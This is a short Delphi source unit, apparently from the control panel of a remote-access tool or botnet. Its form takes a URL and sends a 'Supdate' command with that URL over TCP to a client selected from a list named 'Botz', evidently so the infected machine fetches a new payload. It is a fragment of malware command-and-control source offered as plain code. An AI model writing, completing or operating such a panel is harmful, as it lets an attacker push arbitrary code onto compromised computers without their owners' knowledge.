unit Updater;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls;

type
  TForm7 = class(TForm)
    Label1: TLabel;
    Button1: TButton;
    EdtUrl: TEdit;
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form7: TForm7;

implementation

{$R *.dfm}

uses UMian;

procedure TForm7.Button1Click(Sender: TObject);
begin
if EdtUrl.Text <> '' then
    begin
    form1.TCPServerSendStr('Supdate|' + EdtUrl.Text,strtoint(form1.Botz.Selected.Caption));
    sleep(100);
    form7.Close;
    end
    else
    begin
      showmessage('Error.');
    end;
end;

end.
